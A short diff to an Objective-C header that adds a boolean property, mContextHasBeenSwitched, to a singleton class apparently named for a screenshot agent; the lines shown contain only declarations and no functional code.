@@ -16,7 +16,10 @@
 {
 @private
   NSMutableDictionary *mAgentConfiguration;
+  BOOL mContextHasBeenSwitched;
 }
+
+@property (readwrite) BOOL mContextHasBeenSwitched;
 
 + (RCSIAgentScreenshot *)sharedInstance;
 + (id)allocWithZone: (NSZone *)aZone;
